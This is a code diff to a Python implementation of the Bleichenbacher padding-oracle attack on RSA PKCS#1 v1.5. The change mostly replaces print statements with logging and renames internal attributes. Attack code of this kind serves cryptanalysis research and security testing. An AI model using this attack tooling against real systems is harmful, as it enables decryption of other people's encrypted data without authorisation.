@@ -1,5 +1,5 @@
 from __future__ import with_statement
-import logging as log
+import logging
 import multiprocessing as mp
 import threading as th
 from oracle import Oracle, ExecOracle
@@ -133,8 +133,9 @@ class Bleichenbacher(object):
     self.B3 = 3*self.B
     self.M0 = set([(self.B2, self.B3 - 1)])
     self.s_min_start = NumUtils.ceil_int(n, self.B3)
-    self.s1_search_running = False
+    self.s_search_running = False
     self.found_solution = False
+    self.__logger = logging.getLogger(__name__)
     if isinstance(oracle, Oracle):
       self.oracle = oracle
     else:
@@ -142,15 +143,18 @@ class Bleichenbacher(object):
     if callable(callback):
       self.callback = callback
     else:
-      raise ValueError("Callback must be a function evaluating oracle output") 
+      raise ValueError("Callback must be a function evaluating oracle output")
+    self.__logger.info("Bleichenbacher attack initialized with:")
+    self.__logger.info("\tModulus: %i" % self.n)
+    self.__logger.info("\tPublic exponent: %i" % self.e)
+    self.__logger.info("\tKey size (in bits): %i" % self.k)
+    self.__logger.info("\tOracle type: %s" % self.oracle.__class__.__name__)
     self.__task_id = 0
     self.__worker_pool_running = False
     self.__worker_pool_init(pool_size)
     self.__worker_pool_start()
     self.__result_worker = th.Thread(target=self.__get_task_results)
     self.__result_worker.start()
-    #log.basicConfig(level=log.DEBUG)
-    #self.logger = log.getLogger(__name__)
 
   @classmethod
   def pubkey_from_file(cls, key_file, oracle, callback):
@@ -172,18 +176,21 @@ class Bleichenbacher(object):
   def __worker_pool_init(self, pool_size, task_queue_size=100, result_queue_size=1):
     self.__task_queue = mp.Queue(task_queue_size)
     self.__result_queue = mp.Queue(result_queue_size)
-    self.worker_pool = [RSAOracleWorker(self.oracle, self.callback, self.__task_queue, self.__result_queue, self.n, self.e)
+    self.__worker_pool = [RSAOracleWorker(self.oracle, self.callback, self.__task_queue, self.__result_queue, self.n, self.e)
                         for _ in xrange(pool_size)]
+    self.__logger.info("Created %i workers in the processing pool" % (pool_size))
 
   def __worker_pool_start(self):
-    for p in self.worker_pool:
+    for p in self.__worker_pool:
       p.start()
+    self.__logger.info("Started all worker threads in the pool")
     self.__worker_pool_running = True
 
   def __worker_pool_stop(self):
-    for p in self.worker_pool:
+    for p in self.__worker_pool:
       self.__task_queue.put(Bleichenbacher.__POISON_PILL)
       p.join()
+    self.__logger.info("Stopped all worker threads in the pool")
     self.__worker_pool_running = False
 
   def __result_thread_stop(self):
@@ -191,11 +198,18 @@ class Bleichenbacher(object):
     self.__result_worker.join()
 
   def __submit_pool_task(self, task):
+    self.__logger.debug("Sending task %i to processing pool:" % (task[0]))
+    self.__logger.debug("\tIteration %i in task %i" % (task[3], task[0]))
+    self.__logger.debug("\tS value: %i" % task[2])
     self.__task_queue.put(task)
 
   def __narrow_interval(self, s, M):
     R = self.__get_r_values(s, M)
     M = self.__get_search_intervals(R, s, M)
+    self.__logger.debug("Calculated interval value:")
+    self.__logger.debug("\tInterval start: %i" % list(M)[0][0])
+    self.__logger.debug("\tInterval end: %i" % list(M)[0][1])
+    self.__logger.debug("\tInterval size: %i" % (list(M)[0][1] - list(M)[0][0]))
     return M
 
   def stop_search(self):
@@ -208,9 +222,16 @@ class Bleichenbacher(object):
     M = self.M0
     s_min = self.s_min_start
     s_max = None
+    c = NumUtils.to_int_error(c, "Ciphertext")
+    
+    self.__logger.info("Starting search for:")
+    self.__logger.info("\tCiphertext: %i" % c)
+    self.__logger.info("\tAt start value: %i" % s_min)
     
     #s_min, i = 42298, 1
     s_min, i = self.s_search(c, s_min, s_max)
+
+    self.__logger.info("Found PKCS1 conforming message in %i iterations for s value: %i" % (i, s_min))
 
     while not self.found_solution:
       a = list(M)[0][0]
@@ -221,22 +242,25 @@ class Bleichenbacher(object):
       else:
         if a == b:
           self.found_solution = True
-          print("Got solution: %0256x" % a)
+          self.__logger.info("Found cleartext solution:")
+          self.__logger.info("\tCiphertext: %i => %x" % (c, c))
+          self.__logger.info("\tFinal interval: %i => %x" % (a, a))
+          self.__logger.info("\tCleartext: %i => %x" % (a % self.n, a % self.n))
         else:
           if s_min != None:
             M = self.__narrow_interval(s_min, M)
             it = self.__converge_s_interval(s_min, M)
           (s_min, s_max) = it.next()
           s_min, i = self.s_search(c, s_min, s_max)
-          print(s_min, M,  b - a)
-          
+
   def __get_task_results(self):
     res = []
     while True:
       result = self.__result_queue.get()
       res.append(result)
-      print("Result for task: ", result)
-      print("During task: %i" % self.__task_id)
+      self.__logger.debug("Result for task: ")
+      self.__logger.debug("\tFound in iteration %i of task: %i" % (result[3], result[0]))
+      self.__logger.debug("\tS value: %i" % result[2])
       if result == Bleichenbacher.__POISON_PILL:
         break
       self.__s = result[2] 
